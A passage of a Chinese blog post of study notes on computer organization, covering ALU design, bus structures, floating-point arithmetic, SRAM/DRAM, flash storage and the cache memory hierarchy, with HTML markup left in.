class="line">重复步骤上一步，连同符号位在内，共做n+1步。</span><br></pre></td></tr></table></figure><p>商的校正<br>算法是在商的末位“恒置1”的舍入条件下推导的，故此算法存在误差，这样引起的最大误差是2-n。在对计算精度没有特殊要求的情况下，一般就采用商的末位“恒置1”的办法，这样操作比较简单，而且易于实现</p><p>进一步提高商的精度</p><ol><li>刚好能除尽时，若除数为正，商不必校正；若除数为负，则商加2-n。</li><li>如不能除尽时，若商为正，则不必校正；若商为负，则商加2-n。</li></ol><h3 id="并行除法器"><a href="#并行除法器" class="headerlink" title="并行除法器"></a>并行除法器</h3><h2 id="定点运算器的组成"><a href="#定点运算器的组成" class="headerlink" title="定点运算器的组成"></a>定点运算器的组成</h2><h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><p>按位非、按位或、按位与、按位异或等</p><h3 id="多功能算术-逻辑运算单元（ALU）"><a href="#多功能算术-逻辑运算单元（ALU）" class="headerlink" title="多功能算术/逻辑运算单元（ALU）"></a>多功能算术/逻辑运算单元（ALU）</h3><p>由一位全加器（FA）构成的行波进位加法器存在的问题：</p><ol><li>串行进位，它的运算时间长；</li><li>只能完成加法和减法两种操作而不能完成逻辑操作。</li></ol><p>多功能算术/逻辑运算单元（ALU）：</p><ol><li>不仅具有多种算术运算和逻辑运算的功能；</li><li>而且具有先行进位逻辑。<br>从而能实现高速运算</li></ol><p>一位全加器逻辑表达式：</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E4%B8%80%E4%BD%8D%E5%85%A8%E5%8A%A0%E5%99%A8%E9%80%BB%E8%BE%91%E8%A1%A8%E8%BE%BE%E5%BC%8F.png" class=""><p><code>Fi＝Xi⊕Yi⊕Cn+i</code>        <code>Cn+i+1＝XiYi+YiCn+i+Cn+iXi</code><br>将Ai和Bi先组合成由控制参数S0、S1、S2、S3控制的组合函数Xi和Yi，作为一位全加器的输入。<br>这样不同的控制参数可以得到不同的组合函数，从而能够实现多种算术运算和逻辑运算</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E7%BB%84%E5%90%88%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E8%BF%90%E7%AE%97.png" class=""><h3 id="内部总线"><a href="#内部总线" class="headerlink" title="内部总线"></a>内部总线</h3><p>计算机内部各部件之间数据传送频繁，为了<code>减少内部数据传送线</code>并<code>便于控制</code>，通常将<code>寄存器间的数据传送通路</code>加以<code>归并</code>，组成<code>总线结构</code>，使不同来源的信息在此传输线上<code>分时传送</code>。</p><p>按<code>总线所处的位置</code>分：</p><ol><li>内部总线（CPU内）</li><li>外部总线（系统总线——CPU与存储器、I/O系统之间的数据传送通路）</li></ol><p>按<code>总线的逻辑结构</code>分：</p><ol><li>单向传送总线</li><li>双向传送总线（带缓冲器、带锁存器）</li></ol><h3 id="定点运算器的基本结构"><a href="#定点运算器的基本结构" class="headerlink" title="定点运算器的基本结构"></a>定点运算器的基本结构</h3><p><code>运算器</code>包括<code>ALU</code>、<code>阵列乘除器</code>、<code>寄存器</code>、<code>多路开关</code>、<code>三态缓冲器</code>、<code>数据总线</code>等逻辑部件。</p><p>运算器的设计主要围绕ALU和寄存器同数据总线之间<code>如何传送操作数和运算结果</code>。</p><h4 id="单总线结构的运算器"><a href="#单总线结构的运算器" class="headerlink" title="单总线结构的运算器"></a>单总线结构的运算器</h4><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%8D%95%E6%80%BB%E7%BA%BF%E7%BB%93%E6%9E%84%E7%9A%84%E8%BF%90%E7%AE%97%E5%99%A8.png" class=""><p>同一时间内，只能有一个操作数出现在总线上。<br>为了把两个操作数输入到ALU，需要分两次传送，因此需要A、B两个缓冲寄存器<br>只有两个操作数同时出现在ALU的两个输入端，ALU才执行加法</p><p><code>缺点</code>：操作速度较慢</p><h4 id="双总线结构的运算器"><a href="#双总线结构的运算器" class="headerlink" title="双总线结构的运算器"></a>双总线结构的运算器</h4><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%8F%8C%E6%80%BB%E7%BA%BF%E7%BB%93%E6%9E%84%E7%9A%84%E8%BF%90%E7%AE%97%E5%99%A8.png" class=""><p>两条总线各自把其数据送至ALU的输入端<br>专用寄存器分成两组，分别与一条总线交换数据<br>ALU的输出不能直接加到总线上去：当形成操作结果的输出时，两条总线都被输入数据占据，因此必须设置缓冲寄存器</p><h4 id="三总线结构的运算器"><a href="#三总线结构的运算器" class="headerlink" title="三总线结构的运算器"></a>三总线结构的运算器</h4><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E4%B8%89%E6%80%BB%E7%BA%BF%E7%BB%93%E6%9E%84%E7%9A%84%E8%BF%90%E7%AE%97%E5%99%A8.png" class=""><p>ALU的两个输入端分别连接两条总线，而ALU的输出与第三条总线相连。<br>算术逻辑操作可以在一步的控制之内完成。<br>设置了总线旁路器，如果一个操作数不需要修改，可以直接从总线2传送到总线3。</p><p><code>特点</code>：操作速度快</p><h2 id="浮点运算方法和浮点运算器"><a href="#浮点运算方法和浮点运算器" class="headerlink" title="浮点运算方法和浮点运算器"></a>浮点运算方法和浮点运算器</h2><h3 id="浮点加、减法运算"><a href="#浮点加、减法运算" class="headerlink" title="浮点加、减法运算"></a>浮点加、减法运算</h3><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E6%B5%AE%E7%82%B9%E5%8A%A0%E5%87%8F%E6%B3%95%E8%BF%90%E7%AE%97.png" class=""><ol><li>浮点加减运算大致步骤：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一步：0操作数检查；</span><br><span class="line">第二步：比较阶码大小并完成对阶；</span><br><span class="line">第三步：尾数进行加或减运算；</span><br><span class="line">最后：结果规格化并进行舍入和溢出处理</span><br></pre></td></tr></table></figure></li><li>浮点加减法运算电路</li></ol><h3 id="浮点乘、除法运算"><a href="#浮点乘、除法运算" class="headerlink" title="浮点乘、除法运算"></a>浮点乘、除法运算</h3><ol><li><p>浮点乘法、除法运算规则</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E6%B5%AE%E7%82%B9%E4%B9%98%E9%99%A4%E6%B3%95%E8%BF%90%E7%AE%97%E8%A7%84%E5%88%99.png" class=""></li><li><p>浮点乘、除法运算步骤<br>浮点数的乘除运算大体分为六步：第一步，0 操作数检查，如果被除数x为0，则商为0，如果除数y为0，则商为∞；第二步，阶码加/减操作；第三步，尾数乘/除操作；第四步，结果规格化；第五步，舍入处理；第六步，确定积的符号。</p></li></ol><p>1）浮点数的阶码运算<br>对阶码的运算有＋1、－1、两阶码求和、两阶码求差四种，运算时还必须检查结果是否溢出。</p><p>2）尾数处理——尾数用原码表示：<br> ① 只要尾数最低位为1，或移出的几位中有为1的数值位，就使最低位的值为1；<br> ② 0舍1入，即当丢失的最高位的值为1时，把这个1加到最低数值位上进行修正。</p><h1 id="多层次的存储器"><a href="#多层次的存储器" class="headerlink" title="多层次的存储器"></a>多层次的存储器</h1><h2 id="存储器概述"><a href="#存储器概述" class="headerlink" title="存储器概述"></a>存储器概述</h2><p>全机中心地位<br><code>存储器</code>：是计算机系统中的记忆设备，用来存放程序和数据。<br><code>存储元</code>：存储器的最小组成单位，用以存储1位二进制代码。<br><code>存储单元</code>：是CPU访问存储器基本单位，由若干个具有相同操作属性的存储元组成。<br><code>单元地址</code>：在存储器中用以表识存储单元的唯一编号，CPU通过该编号访问相应的存储单元。<br><code>字存储单元</code>：存放一个字的存储单元，相应的单元地址叫字地址<br><code>字节存储单元</code>：存放一个字节的存储单元，相应的单元地址叫字节地址。<br><code>按字寻址计算机</code>：可编址的最小单位是字存储单元的计算机<br><code>按字节寻址计算机</code>：可编址的最小单位是字节的计算机。<br><code>存储体</code>：存储单元的集合，是存放二进制信息的地方</p><p>存储器各个概念之间的关系（按字节寻址）</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%AD%98%E5%82%A8%E5%99%A8%E5%90%84%E4%B8%AA%E6%A6%82%E5%BF%B5%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB.png" class=""><h3 id="存储器分类"><a href="#存储器分类" class="headerlink" title="存储器分类"></a>存储器分类</h3><p>按<code>存储介质</code>分：</p><ol><li><code>半导体存储器</code>(双极型 TTL：高速；MOS：高集成度，制造简单，成本低廉，功耗小<br>) 易失</li><li><code>磁表面存储器</code>：磁盘、磁带等 非易失</li><li><code>光盘存储器</code>：用激光在记录介质上进行读写，记录密度高、耐性好、可靠性高、可互换性强 非易失</li></ol><p>按<code>存取方式</code>分：</p><ol><li><code>随机存储器</code>：任何存储单元的内容都能被随机存取，且存取时间和存储单元的物理位置无关——如半导体存储器。</li><li><code>顺序存储器</code>：只能按某种顺序来存取，存取时间和存储单元的物理位置有关——如磁带存储器</li></ol><p>按<code>存储器的读写功能</code>分：</p><ol><li><code>只读存储器（ROM）</code>：存储的内容是固定不变的，只能读出而不能写入的半导体存储器。(通常用来存放固定不变的程序、常数和汉字字库，甚至用于操作系统的固化。也可以作为控制存储器，存放微程序。早期采用掩模工艺，把原始信息记录在芯片中，一旦制成就无法改变)</li><li><code>随机读写存储器（RAM）</code>：既能读出又能写入的半导体存储器，分为静态RAM（SRAM）和动态RAM（DRAM）。</li></ol><p>按<code>信息的易失性</code>分 ：</p><ol><li><code>易失性存储器</code>：断电后信息消失的存储器——如RAM。</li><li><code>非易失性存储器</code>：断电后仍能保存信息的存储器——如磁盘、光盘等。</li></ol><p>按在<code>计算机系统中的作用</code>分：</p><ol><li><code>主存储器</code>、<code>辅助存储器</code>、<code>高速缓冲存储器</code>、<code>控制存储器</code>等。</li></ol><h3 id="存储器的分级"><a href="#存储器的分级" class="headerlink" title="存储器的分级"></a>存储器的分级</h3><p>要求：容量大，速度快，成本低<br>采用多级存储器体系结构，即使用<code>高速缓冲存储器</code>、<code>主存储器</code>和<code>外存储器(辅存)</code></p><p><code>内存储器（内存）</code>：CPU能直接访问的存储器，包括<code>cache</code>和<code>主存储器</code></p><p><code>外存储器（外存）</code>：主板外的存储器。<br>外存的信息必须调入内存后才能被CPU处理。</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%AD%98%E5%82%A8%E5%99%A8%E5%88%86%E7%BA%A7.png" class=""><p><code>高速缓冲存储器</code>：简称<code>cache</code>，高速存取指令和数据，存取速度快，单存储容量小<br><code>主存储器</code>：简称<code>主存</code>，存放计算机运行期间的大量程序和数据，存取速度较快，存储容量不大<br><code>外存储器</code>：简称<code>外存</code>，存放系统程序和大型数据文件及数据库，存储容量大，位成本低，速度慢，信息调入内存后才能被CPU处理</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%AD%98%E5%82%A8%E5%99%A8%E5%AD%98%E5%8F%96%E6%97%B6%E9%97%B4.png" class=""><p><strong>内存与外存的关系及比较</strong></p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%86%85%E5%AD%98%E4%B8%8E%E5%A4%96%E5%AD%98%E5%85%B3%E7%B3%BB%E5%8F%8A%E6%AF%94%E8%BE%83.png" class=""><h3 id="主存储器的技术指标"><a href="#主存储器的技术指标" class="headerlink" title="主存储器的技术指标"></a>主存储器的技术指标</h3><p><code>存储容量</code>：所包含的存储单元的总数（单位：MB或GB）<br><code>存取时间（存储器访问时间）</code>：一次读操作命令发出到该操作完成，将数据读出到数据总线上所经历的时间，通常取写操作时间等于读操作时间<br><code>存储周期</code>：连续启动两次读操作所需间隔的最小时间，<code>略大于存取时间</code>。存储周期等于存取时间加上下一次存取开始前所要求的附加时间，因为存储器由于读出放大器、驱动电路等都有一段稳定恢复时间，所以读出后不能立即进行下一次访问<br><code>存储器带宽</code>：单位时间里存储器所存取的信息量，通常<code>B/s</code>作为度量单位，是衡量数据<code>传输速率</code>的重要技术指标</p><h2 id="SRAM存储器"><a href="#SRAM存储器" class="headerlink" title="SRAM存储器"></a>SRAM存储器</h2><h3 id="基本的静态存储元阵列"><a href="#基本的静态存储元阵列" class="headerlink" title="基本的静态存储元阵列"></a>基本的静态存储元阵列</h3><p>SRAM基本存储元采用<code>触发器原理</code>，数据保存在一对<code>正负反馈门电路</code>中，<code>只要供电，数据就一直保持</code>。</p><p><code>不是破环性读出</code>，信息读出后仍保持原状态，<code>不需要重写，即无需刷新</code>！</p><p>电源掉电时，原存信息丢失，属于<code>易失性</code>半导体存储器。</p><p>任何一个SRAM，都有三组信号线：</p><ol><li><code>地址线</code>：图中共有6条地址线A5～A0，决定了存储器的容量是2^6=64个存储单元。</li><li><code>数据线</code>：图中共有4条数据线I/O3～I/O0，决定了存储器的字长是4位。</li><li><code>控制线</code>：R/“W”  ̅指定了对存储器进行读（高电平）还是写（低电平）。<img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E9%9D%99%E6%80%81%E5%AD%98%E5%82%A8%E5%85%83%E9%98%B5%E5%88%97.png" class=""></li></ol><h3 id="基本的SRAM逻辑结构"><a href="#基本的SRAM逻辑结构" class="headerlink" title="基本的SRAM逻辑结构"></a>基本的SRAM逻辑结构</h3><p>一个SRAM存储器由<code>存储体</code>、<code>读写电路</code>、<code>地址译码电路</code>和<code>控制电路</code>等组成</p><p><code>存储体</code>：将基本的存储电路有规则地组织起来，就是存储体</p><p>SRAM芯片采用二级译码：即双译码方式<br>将地址分成x向、y向两部分，第一级进行x向（行译码）和y向（列译码）的独立译码，然后在存储阵列中完成第二级的交叉译码。</p><h3 id="存储器的读写周期"><a href="#存储器的读写周期" class="headerlink" title="存储器的读写周期"></a>存储器的读写周期</h3><p><code>读出时间</code>：从给出有效地址到外部数据总线上稳定地出现所读出的数据信息所经历的时间。t(AO)<br><code>读周期时间</code>：则是存储器进行两次连续读操作时所必须间隔的时间，它总是大于或等于读出时间。t(RC)&gt;=t(AO)</p><p>t(WC)时间称为<code>写周期时间</code>。为了控制方便，一般取<code>读周期时间等于写周期时间</code>，通常称为<code>存储周期</code>（存取周期）</p><h2 id="DRAM存储器"><a href="#DRAM存储器" class="headerlink" title="DRAM存储器"></a>DRAM存储器</h2><h3 id="DRAM存储元"><a href="#DRAM存储元" class="headerlink" title="DRAM存储元"></a>DRAM存储元</h3><p>靠<code>电容存储电荷的原理</code>存储信息，电容上的电荷一般只能维持1～2ms，因此即使电源不掉电，信息也会自动消失。<br>与SRAM相比<code>集成度更高</code>，<code>功耗更低</code>，<code>用于构建主存储器</code>。</p><h3 id="DRAM芯片的逻辑结构"><a href="#DRAM芯片的逻辑结构" class="headerlink" title="DRAM芯片的逻辑结构"></a>DRAM芯片的逻辑结构</h3><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/DRAM%E8%8A%AF%E7%89%87%E7%9A%84%E9%80%BB%E8%BE%91.png" class=""><p>两个电源脚，两个地线脚，一个空脚（NC）。<br>A0 ~ A10：地址输入线；<br><code>RAS非</code>：行地址选通信号线，兼起片选信号作用（整个读写周期， <code>RAS非</code> 一直处于有效状态）；<br><code>CAS非</code>：列地址选通信号线；<br>WE：写控制信号 ；<br>OE：读控制信号；<br>D1 ~ D4：数据输入/输出线。</p><h3 id="DRAM读写周期、刷新周期"><a href="#DRAM读写周期、刷新周期" class="headerlink" title="DRAM读写周期、刷新周期"></a>DRAM读写周期、刷新周期</h3><ol><li>读周期时序<br>地址总线上行地址有效 → 行选通信号(“RAS” ) ̅有效，行地址被打入行地址锁存器 → 地址总线上列地址有效 → 列选通信号(“CAS” ) ̅有效，列地址被打入列地址锁存器 → 读命令有效 → 数据输出</li><li>写周期时序<br>地址总线上行地址有效 → 行选通信号(“RAS” ) ̅有效，行地址被打入行地址锁存器 → 地址总线上列地址有效 → 列选通信号(“CAS” ) ̅有效，列地址被打入列地址锁存器 → 写命令有效 → 数据总线上输入数据有效</li></ol><p><code>读周期</code>、<code>写周期</code>的定义是从行选通信号<code>RAS非</code> ̅下降沿开始，到下一个<code>RAS非</code>号的下降沿为止的时间，也就是连续两个读周期的时间间隔<br>3. 刷新周期<br>集中式刷新、分散式刷新</p><h3 id="存储器容量的扩充"><a href="#存储器容量的扩充" class="headerlink" title="存储器容量的扩充"></a>存储器容量的扩充</h3><p>通常选用<code>ROM</code>芯片存放<code>系统程序</code>，选用<code>RAM</code>芯片存放<code>用户程序</code></p><p>存储芯片容量可表示为：2^n×m位/片<br>2^n：存储芯片字数，需要n根地址总线<br>m位：存储芯片字长，需要m根数据总线</p><p><strong>字和位扩展</strong><br>扩展时所需芯片数：d = “设计要求的存储器容量”/“已知芯片存储容量” </p><h4 id="位扩展"><a href="#位扩展" class="headerlink" title="位扩展"></a>位扩展</h4><p>只加大字长，而存储器的字数与存储芯片字数一致，对芯片没有片选要求</p><p>例1：用8k×1位的存储芯片组成8k×8位的存储器需<code>8片</code>芯片<br>地址总线 —— 需要 13 根<br>数据总线 —— 共需 8 根              </p><h4 id="字扩展"><a href="#字扩展" class="headerlink" title="字扩展"></a>字扩展</h4><p>仅在字数方向扩展，而字长不变</p><p>例2：用16Kx8位的存储芯片组成64Kx8位的存储器需<code>4片</code>芯片<br>地址总线 —— 共需16根<br>数据总线 —— 需要8根</p><h4 id="字位扩展"><a href="#字位扩展" class="headerlink" title="字位扩展"></a>字位扩展</h4><p>在字数方向和字长方向上同时扩展。</p><p>例3：用1Kx4位的存储芯片组成4Kx8位的存储器需<code>8片</code>芯片<br>地址总线 —— 共需12根<br>数据总线 —— 共需8根</p><p><strong>总结</strong><br>DRAM和SRAM的比较<br>优点：</p><ol><li>在同样大小的芯片中，DRAM的集成度远高于SRAM</li><li>DRAM行、列地址分时传送，减少了芯片引脚，封装尺寸也减少</li><li>DRAM的价格比SRAM便宜</li></ol><p>缺点：</p><ol><li>由于使用动态元件（电容），速度比SRAM慢。</li><li>DRAM需要再生，故需配置再生电路，也需要消耗一部分的功率</li></ol><p>容量不大的<code>高速缓冲存储器</code>大多用SRAM实现</p><h2 id="只读存储器和闪速存储器"><a href="#只读存储器和闪速存储器" class="headerlink" title="只读存储器和闪速存储器"></a>只读存储器和闪速存储器</h2><h3 id="只读存储器"><a href="#只读存储器" class="headerlink" title="只读存储器"></a>只读存储器</h3><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%8F%AA%E8%AF%BB%E5%AD%98%E5%82%A8%E5%99%A8.png" class=""><h3 id="闪速存储器"><a href="#闪速存储器" class="headerlink" title="闪速存储器"></a>闪速存储器</h3><h4 id="闪速存储器-1"><a href="#闪速存储器-1" class="headerlink" title="闪速存储器"></a>闪速存储器</h4><p>又称：快擦型存储器<br>新型的、具有性价比更好、可靠性更高的可擦除非易失性存储器</p><p>既有EPROM价格便宜、集成度高的优点，又有EEPROM电可擦除重写的特性，能够整片擦除</p><p>闪速存储器是一种高密度、非易失性的读/写存储器，它突破了传统的存储器体系，改善了现有存储器的特性</p><p>特点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">是E2PROM的演进，本质上还是属于E2PROM；</span><br><span class="line">廉价的高密度——具有巨大比特数目的存储容量；</span><br><span class="line">属于非易失性存储器，适合长期保存信息；</span><br><span class="line">能快速擦写，写入前必须先擦除，因此写比读要慢；</span><br><span class="line">存储器访问周期短、功耗低；</span><br><span class="line">现在常用的SSD固态硬盘是由Flash芯片组成的</span><br></pre></td></tr></table></figure><h4 id="固态硬盘-SSD"><a href="#固态硬盘-SSD" class="headerlink" title="固态硬盘(SSD)"></a>固态硬盘(SSD)</h4><p>又称：电子硬盘<br>使用闪存组成的外部存储系统，与U盘并没有本质差别，只是容量更大，存取性能更好</p><p>用闪存颗粒代替了磁盘作为存储介质，利用闪存的特点，以区块写入和抹除的方式进行数据的读取和写入</p><p>特点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">写操作比读操作慢得多</span><br><span class="line">电信号的控制使得固态硬盘的内部传输速率远远高于常规硬盘</span><br><span class="line">其接口规范和定义、功能及使用方法与传统硬盘完全相同，在产品外形和尺寸上也与普通硬盘一致。目前接口标准上使用USB、SATA和IDE，因此SSD是通过标准磁盘接口与I&#x2F;O总线互连的</span><br><span class="line">在SSD中有一个闪存翻译层，它将来自CPU的逻辑磁盘块读写请求翻译成对底层SSD物理设备的读写控制信号。因此，这个闪存翻译层相当于磁盘控制器。</span><br><span class="line">闪存的擦写次数有限，所以频繁擦写会降低其写入使用寿命</span><br></pre></td></tr></table></figure><h4 id="各种存储器性能比较"><a href="#各种存储器性能比较" class="headerlink" title="各种存储器性能比较"></a>各种存储器性能比较</h4><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%90%84%E7%A7%8D%E5%AD%98%E5%82%A8%E5%99%A8%E6%80%A7%E8%83%BD%E6%AF%94%E8%BE%83.png" class=""><h2 id="并行存储器"><a href="#并行存储器" class="headerlink" title="并行存储器"></a>并行存储器</h2><p>采取一些加速CPU和存储器之间有效传输的特殊措施：<br><code>芯片技术</code>：研究开发高性能芯片<br><code>结构技术</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">采用空间并行操作方式　　　            ——双端口存储器　</span><br><span class="line">提高时间读出并行性                            ——多模块交叉存储器</span><br><span class="line">牺牲硬件来缩短主存储器的读出时间   ——相联存储器</span><br></pre></td></tr></table></figure><h3 id="双端口存储器"><a href="#双端口存储器" class="headerlink" title="双端口存储器"></a>双端口存储器</h3><p>同一个存储器具有<code>两组相互独立的读写控制线路</code>，是一种高速工作的存储器。</p><p>当两个端口的地址不相同时，在两个端口上进行读写操作，一定不会发生冲突。<br>当两个端口同时存取存储器同一存储单元时，便发生读写冲突。<br>为解决读写冲突问题，设置<code>BUSY非</code>标志</p><h3 id="多模块交叉存储器"><a href="#多模块交叉存储器" class="headerlink" title="多模块交叉存储器"></a>多模块交叉存储器</h3><p>大存储器在一个存储周期中读出的不是一个存储单元的w位信息，而是n个字，这样在单位时间里存储器提供的信息量可提高n倍，这样组织的主存系统称为<code>并行主存系统</code></p><h4 id="存储器的模块化组织"><a href="#存储器的模块化组织" class="headerlink" title="存储器的模块化组织"></a>存储器的模块化组织</h4><p>一个由若干个模块组成的主存储器是线性编址的。这些地址在各模块中有两种安排方式：<code>顺序方式</code>、<code>交叉方式</code></p><p><strong>顺序方式</strong><br>各模块一个接一个串行工作。某个模块进行存取时，其他模块不工作。<br>优点：<br>某一模块出现故障时，其他模块可以照常工作<br>通过增添模块来扩充存储器容量比较方便</p><p>缺点：<br>各模块串行工作，存储器的带宽受到了限制</p><p><strong>交叉方式</strong><br>连续地址分布在相邻的不同模块内。同一个模块内的地址都是不连续的。<br>对连续字的成块传送可实现多模块流水式并行存取，大大提高存储器的带宽</p><h4 id="多模块交叉存储器的基本结构"><a href="#多模块交叉存储器的基本结构" class="headerlink" title="多模块交叉存储器的基本结构"></a>多模块交叉存储器的基本结构</h4><h3 id="相联存储器"><a href="#相联存储器" class="headerlink" title="相联存储器"></a>相联存储器</h3><h4 id="相联存储器的基本原理"><a href="#相联存储器的基本原理" class="headerlink" title="相联存储器的基本原理"></a>相联存储器的基本原理</h4><p>相联存储器不是按地址访问的存储器，而是按内容寻址的存储器。</p><p>相联存储器是指其中任一存储项内容作为地址来存取的存储器</p><p>选用来寻址存储器的子段叫做<code>关键字</code>，简称<code>“键”</code></p><p>相联存储器的基本原理是把存储单元所存内容的某一部分作为检索项（即关键字项），去检索该存储器，并将存储器中与该检索项符合的存储单元内容进行读出或写入</p><p>格式：<br><code>KEY，DATA</code><br>KEY是地址，DATA是被读写信息</p><h4 id="相联存储器举例"><a href="#相联存储器举例" class="headerlink" title="相联存储器举例"></a>相联存储器举例</h4><p><code>SRR为查找结果寄存器</code></p><p>在计算机系统中，相联存储器主要用于虚拟存储器中存放分段表、页表和快表；在高速缓冲存储器中，相联存储器作为存放cache的行地址之用</p><h2 id="cache存储器"><a href="#cache存储器" class="headerlink" title="cache存储器"></a>cache存储器</h2><h3 id="存储体系"><a href="#存储体系" class="headerlink" title="存储体系"></a>存储体系</h3><p><code>存储体系</code>：把各种不同存储容量、不同存取速度、不同价格的存储器，组成层次结构，并通过管理软件和辅助硬件将不同性能的存储器组合成有机的整体，称为计算机的存储层次或存储体系</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%AD%98%E5%82%A8%E4%BD%93%E7%B3%BB.png" class=""><p>在任何指定时间，<strong>数据只能在相邻的两级之间拷贝</strong></p><h4 id="存储体系的实现原理：程序访问的局部性原理"><a href="#存储体系的实现原理：程序访问的局部性原理" class="headerlink" title="存储体系的实现原理：程序访问的局部性原理"></a>存储体系的实现原理：程序访问的局部性原理</h4><p>CPU访问存储器时，无论是取指令还是存取数据，所访问的存储单元都趋于聚集在一个较小的连续区域中。<br>这种对局部范围的存储器地址频繁访问，而对此范围以外的地址则访问甚少的现象就称为<code>程序访问的局部性原理</code></p><p><code>时间局部性</code>：如果一个信息项正在被访问，那么在近期它很可能还会被再次访问。（程序循环、堆栈）<br><code>空间局部性</code>：在最近的将来将用到的信息很可能与现在正在使用的信息在空间地址上是临近的。（指令顺序执行、数组存放）</p><p><code>程序访问的局部性原理主要表现：</code><br>程序<code>地址的分布是连续</code>的，加上循环程序段和子程序段要重复执行多次，因此，对程序地址的访问具有<code>相对集中的倾向</code>。<br>数据分布的这种集中倾向不如指令明显，但对数组的存储和访问以及工作单元的选择都可以使存储器地址相对集中。</p><p><code>其它原因：</code><br>在高速机器中，信号传输是延迟的一个重要原因。而大的存储器因地址译码级数多，信号延迟会更大。<br>相同器件条件下，<code>小容量存储器比大容量存储器快</code>。<br><code>容量小、离CPU近的高速存储器存放最近要访问的数据</code>。<br>优先考虑最近经常被访问的代码。</p><h4 id="存储体系的特点"><a href="#存储体系的特点" class="headerlink" title="存储体系的特点"></a>存储体系的特点</h4><ol><li>包含性<br>所有信息项最初存放在最外层Mn，在处理过程中，它的子集复制到Mn-1，同样， Mn-1的子集复制到Mn-2，……<br>如果在Mi中找到一个信息字，那么同一个字的复制品在所有的高层Mi+1，Mi+2，……，Mn中都一定可以找到</li><li>相邻层之间的数据传送单位<br> CPU         &lt;-&gt; 高速缓存：字    假设：[1个字包含4个字节]<br> 高速缓存 &lt;-&gt; 主存储器：块                [每块32个字节（8个字）]<br> 主存         &lt;-&gt; 磁盘：        页面            [每页4K字节，包含128块]<br> 磁盘         &lt;-&gt; 磁带：        段<img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E7%9B%B8%E9%82%BB%E5%B1%82%E4%B9%8B%E9%97%B4%E7%9A%84%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%81.png" class=""></li></ol><h4 id="存储体系的性能"><a href="#存储体系的性能" class="headerlink" title="存储体系的性能"></a>存储体系的性能</h4><p><code>命中</code>：在Mi中找到一个信息项时，称之为命中，反之称为失效<br><code>命中率</code>：在Mi层的命中率hi是信息项可在Mi中找到的概率。<br><code>失效率</code>：在Mi中的失效率定义为1-hi<br><code>相继层的命中率</code>是存储器容量、管理策略和程序行为的函数，它是独立的随机变量，其值在0到1之间</p><p>对Mi的<code>访问频率fi</code>是指在较低层次有i-1次失效而在Mi有一次命中时访问Mi成功的概率<br>                     <code>fi = (1-h1)·(1-h2)···(1-h(i-1))hi</code></p><p>存储体系的目标是实现：<code>f1 ≫ f2 ≫ ··· ≫ fn</code>，说明：访问内存比访问外存要多</p><p><code>存储体系的性能</code>是由层次结构的<code>有效存取时间Teff</code>决定的，它依赖于相继层次的命中率和访问频率。</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/Teff.png" class=""><p>每当发生失效时，就要付出代价去访问较高层次的存储器</p><p>这种失效在cache中称为<code>块失效</code>，在主存储器中称为<code>缺页错</code>（page 